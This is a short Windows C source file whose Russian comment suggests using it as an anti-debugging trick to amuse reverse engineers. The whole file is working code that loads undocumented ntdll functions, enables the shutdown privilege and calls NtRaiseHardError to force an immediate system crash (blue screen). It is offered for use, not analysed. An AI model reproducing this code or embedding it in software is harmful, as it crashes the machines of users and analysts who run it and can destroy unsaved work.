//Можно использовать это в анти-дебаге, чтоб реверсеру стало смешно.
#include <Windows.h>
#include <ntstatus.h>

#define PUNICODE_STRING ULONG_PTR
#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PBOOL Enabled);
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorCode, ULONG NumberOfParameters, PUNICODE_STRING UnicodeStringParameterMask, PVOID Parameters, ULONG ResponseOptions, PULONG_PTR Response);

void APIENTRY Entry(void) {
	pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");
	pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtRaiseHardError");
	
	BOOL Enabled;
	ULONG Response;
	if((RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &Enabled)) == 0) {
		NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &Response);
	}

	return 0;
}
